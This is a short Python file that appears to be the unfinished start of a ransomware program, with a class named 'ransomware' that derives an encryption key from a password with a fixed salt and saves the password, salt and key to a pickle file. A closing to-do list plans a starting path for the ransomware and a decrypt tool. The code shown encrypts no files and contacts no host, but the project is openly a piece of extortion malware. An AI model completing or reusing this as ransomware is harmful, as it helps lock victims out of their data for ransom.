import socket
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import json
import pickle

class ransomware:

    def __init__(self):
        self.salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c'
        self.kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=1000000,
            backend=default_backend()
            )

    def key_gen(self, passwd):

        if passwd:
            self.passwd = passwd
        else:
            self.passwd = Fernet.generate_key()

        self.key = base64.urlsafe_b64encode(self.kdf.derive(self.passwd))
        return self.key
    
    def save_key(self, filename):
        try:
            data = {
                'password' : self.passwd,
                'salt' : self.salt,
                'key' : self.key
            }
            with open(filename, 'wb') as file:
                data = pickle.dumps(data)
                file.write(data)
                file.close()

        except  Exception as e:
            print("save_key error: %s" %str(e) )

#task list for today    
# set password
# generate key
# save key
# set path for ransomware to start from
# load keys
# decrypt tool